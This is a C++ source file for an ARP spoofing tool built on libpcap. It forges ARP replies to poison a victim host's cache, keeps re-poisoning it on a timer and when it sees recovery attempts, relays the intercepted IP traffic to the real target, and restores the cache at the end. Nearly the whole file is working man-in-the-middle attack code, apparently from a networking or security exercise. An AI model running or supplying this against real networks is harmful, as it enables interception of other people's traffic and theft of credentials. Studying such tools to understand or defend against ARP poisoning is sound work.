#include "ty_network.h"

int session_data::status = 0;

std::mutex session_data::mtx_status;

char *usr_ether_ntoa_r (const struct ether_addr *addr, char *buf)
{
	snprintf(buf, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
			addr->ether_addr_octet[0], addr->ether_addr_octet[1],
			addr->ether_addr_octet[2], addr->ether_addr_octet[3],
			addr->ether_addr_octet[4], addr->ether_addr_octet[5]);
	return buf;
}

char *usr_ether_ntoa (const struct ether_addr *addr)
{
	static char buf[18];
	return usr_ether_ntoa_r(addr, buf);
}

void my_assert(bool cond, const char *format, ...){
	if(!cond){
		va_list ap;
		va_start(ap, format);
		vfprintf(stderr, format, ap);
		va_end(ap);
		exit(1);
	}
}

int GetLocalIP(struct in_addr* IP, const char *interface){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, strlen(interface));
	if(ioctl(fd, SIOCGIFADDR, &ifr) == -1) return 0;
	close(fd);

	memcpy(IP, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, sizeof(in_addr));

	return 1;
}


int GetLocalHA(struct ether_addr* HA, const char *interface){
	int fd;
	struct ifreq ifr;

	fd = socket(PF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, strlen(interface));
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) return 0;
	close(fd);

	memcpy(HA, ifr.ifr_ifru.ifru_hwaddr.sa_data, sizeof(ether_addr));

	return 1;
}


int GetHA(pcap_t *handle, const struct ether_addr *srcHA, const struct in_addr *srcIP, struct ether_addr *dstHA, const struct in_addr *dstIP){
	unsigned char *packet = (unsigned char *)malloc(ETHER_MAX_LEN);
	size_t tot_len = 0, len;
	my_assert( (len = GenEtherPacket(packet, (const ether_addr*)"\xff\xff\xff\xff\xff\xff\xff\xff", srcHA, ETHERTYPE_ARP)) >= 0, "Error on Generate Ether Packet!\n"); tot_len += len;
	my_assert( (len = GenARPPacket(packet+tot_len, ARPOP_REQUEST, srcHA, srcIP, (const ether_addr*)"\x00\x00\x00\x00\x00\x00\x00\x00", dstIP)) >= 0, "Error on Generate ARP Packet\n"); tot_len += len;

	if( pcap_sendpacket(handle, packet, tot_len) != 0){ 
		fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}

	int res;
	struct pcap_pkthdr* 		header;
	struct ether_header* 	eh;
	struct arphdr 			*arp_hdr;
	struct arp_payload		*arp_pay;
	const unsigned char* buf;
	while( (res = pcap_next_ex(handle, &header, &buf)) >= 0){
		if (res == 0) continue;
		eh = (ether_header *)buf;
		if(ntohs(eh->ether_type) != ETH_P_ARP) continue;
		if(memcmp(eh->ether_dhost, srcHA, ETHER_ADDR_LEN)) continue;
		arp_hdr = (struct arphdr*)(buf + sizeof(struct ether_header));
		arp_pay = (struct arp_payload*)((unsigned char*)arp_hdr + sizeof(struct arphdr));
		if(ntohs(arp_hdr->ar_op) != ARPOP_REPLY) continue;
		if(memcmp(&(arp_pay->TargetHA), srcHA, ETHER_ADDR_LEN)) continue;
		if(memcmp(&(arp_pay->TargetIP), srcIP, IP_ADDR_LEN)) continue;
		if(memcmp(&(arp_pay->SenderIP), dstIP, IP_ADDR_LEN)) continue;

		memcpy(dstHA, &(arp_pay->SenderHA), ETHER_ADDR_LEN);

		break;
	}

	free(packet);

	return 1;
}



// Success => len, Fail => -1
size_t GenEtherPacket(unsigned char *packet, const struct ether_addr* dst_ha, const struct ether_addr* src_ha, u_int16_t ether_type){
	struct ether_header eh;

	memcpy(eh.ether_dhost, dst_ha, ETHER_ADDR_LEN);
	memcpy(eh.ether_shost, src_ha, ETHER_ADDR_LEN);
	eh.ether_type = htons(ether_type);

	memcpy(packet, &eh, sizeof(struct ether_header));

	return sizeof(ether_header);
}

size_t GenARPPacket(unsigned char *packet, const u_int16_t opcode, const struct ether_addr *SenderHA, const struct in_addr *SenderIP, const struct ether_addr *TargetHA, const struct in_addr *TargetIP){
	struct arphdr 	arp_hdr;
	struct arp_payload	arp_pay;

	arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_hdr.ar_hln = ETHER_ADDR_LEN;
	arp_hdr.ar_pln = IP_ADDR_LEN;
	arp_hdr.ar_op  = htons(opcode);

	memcpy(&arp_pay.SenderHA, SenderHA, ETHER_ADDR_LEN);
	memcpy(&arp_pay.SenderIP, SenderIP, IP_ADDR_LEN);
	memcpy(&arp_pay.TargetHA, TargetHA, ETHER_ADDR_LEN);
	memcpy(&arp_pay.TargetIP, TargetIP, IP_ADDR_LEN);	

	int len = 0;
	memcpy(packet + len, &arp_hdr, sizeof(struct arphdr)); len += sizeof(struct arphdr);
	memcpy(packet + len, &arp_pay, sizeof(struct arp_payload)); len += sizeof(struct arp_payload);

	return len;
}

void *ArpSpoof(const char *interface, struct session_data *se_data){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	my_assert( (handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf)) != NULL, "couldn't open device %s: %s\n", interface, errbuf);

	unsigned char *attack_packet = (unsigned char *)malloc(ETHER_MAX_LEN);
	size_t attack_packet_len = 0, len;
	my_assert( (len = GenEtherPacket(attack_packet, &se_data->SenderHA, &se_data->AttackHA, ETHERTYPE_ARP)) >= 0, "Error on Generate Ether Packet!\n"); attack_packet_len += len;
	my_assert( (len = GenARPPacket(attack_packet+attack_packet_len, ARPOP_REPLY, &se_data->AttackHA, &se_data->TargetIP, &se_data->SenderHA, &se_data->SenderIP)) >= 0, "Error on Generate ARP Packet\n"); attack_packet_len += len;
	my_assert( pcap_sendpacket(handle, attack_packet, attack_packet_len) == 0, "Error sending the packet(line 149): %s\n", pcap_geterr(handle));

	printf("First Attack packet Send to %s\n",inet_ntoa(se_data->SenderIP));

	session_data::mtx_status.lock();
	session_data::status++;
	session_data::mtx_status.unlock();

	int res;
	const unsigned char* buf;
	struct pcap_pkthdr* header;
	struct timespec start, finish;
	double elapsed;
	clock_gettime(CLOCK_MONOTONIC, &start);
	while( (res = pcap_next_ex(handle, &header, &buf)) >= 0){
		clock_gettime(CLOCK_MONOTONIC, &finish);
		elapsed = (double)(finish.tv_sec - start.tv_sec) + (double)(finish.tv_nsec - start.tv_nsec) / 1000000000.0;
		if(elapsed >= INTERVAL_ARP){
			my_assert( pcap_sendpacket(handle, attack_packet, attack_packet_len) == 0, "Error sending the packet(line 167): %s\n", pcap_geterr(handle));
			clock_gettime(CLOCK_MONOTONIC, &start);
		}
		if (res == 0) continue;

		int flag = CheckPacket(buf, header->len, se_data);

		if(flag == 1) {
			if(header->len <= 1500) Relay(handle, buf, header->len, se_data);
		}
		else if(flag == 2) my_assert( pcap_sendpacket(handle, attack_packet, attack_packet_len) == 0, "Error sending the packet(line 177): %s\n", pcap_geterr(handle));

		if(session_data::status < 0) break;
	}
	Recovery(handle, se_data);
	free(attack_packet);
}

int CheckPacket(const unsigned char* packet, int packet_len, struct session_data *se_data){
	ether_header *eh = (ether_header *)packet;
	if(ntohs(eh->ether_type) == ETH_P_IP){
		iphdr* iph = (iphdr *)(packet + sizeof(ether_header));
		if(!memcmp(&eh->ether_shost, &se_data->SenderHA, sizeof(struct ether_addr))){
			if(memcmp(&iph->daddr, &se_data->AttackIP, sizeof(struct in_addr))){
				return 1;
			}
		}
	}
	else if(ntohs(eh->ether_type) == ETH_P_ARP){
		struct arphdr 		*arp_hdr = (struct arphdr*)(packet + sizeof(struct ether_header));
		struct arp_payload 	*arp_pay = (struct arp_payload*)((unsigned char*)arp_hdr + sizeof(struct arphdr));
		if(!memcmp(&eh->ether_shost, &se_data->SenderHA, sizeof(struct ether_addr))){
			if(ntohs(arp_hdr->ar_op) == ARPOP_REQUEST){
				if(!memcmp(&arp_pay->TargetIP, &se_data->TargetIP, sizeof(struct in_addr))){
					return 2;
				}
			}
		}
		if(!memcmp(&eh->ether_shost, &se_data->TargetHA, sizeof(struct ether_addr))){
			if(!memcmp(&eh->ether_dhost, "\xff\xff\xff\xff\xff\xff\xff\xff", sizeof(struct ether_addr))){
				return 2;
			}
		}
	}
	return 0;
}

int Relay(pcap_t *handle, const unsigned char* packet, int packet_len, struct session_data *se_data){
	ether_header* eh = (ether_header *) packet;
	iphdr* iph = (iphdr *)((unsigned char*)eh + sizeof(ether_header));

	memcpy(eh->ether_shost, &se_data->AttackHA, sizeof(struct ether_addr));
	memcpy(eh->ether_dhost, &se_data->TargetHA, sizeof(struct ether_addr));
	my_assert( pcap_sendpacket(handle, packet, packet_len) == 0, "Error sending the packet(line 220): %s(%d)\n", pcap_geterr(handle), packet_len);
	return 1;
}

int Recovery(pcap_t *handle, struct session_data *se_data){
	unsigned char *recovery_packet = (unsigned char *)malloc(ETHER_MAX_LEN);
	size_t recovery_packet_len = 0, len;
	my_assert( (len = GenEtherPacket(recovery_packet, &se_data->SenderHA, &se_data->TargetHA, ETHERTYPE_ARP)) >= 0, "Error on Generate Ether Packet!\n"); recovery_packet_len += len;
	my_assert( (len = GenARPPacket(recovery_packet+recovery_packet_len, ARPOP_REPLY, &se_data->TargetHA, &se_data->TargetIP, &se_data->SenderHA, &se_data->SenderIP)) >= 0, "Error on Generate ARP Packet\n"); recovery_packet_len += len;
	my_assert( pcap_sendpacket(handle, recovery_packet, recovery_packet_len) == 0, "Error sending the packet(line 229): %s\n", pcap_geterr(handle));
	free(recovery_packet);
	return 1;
}
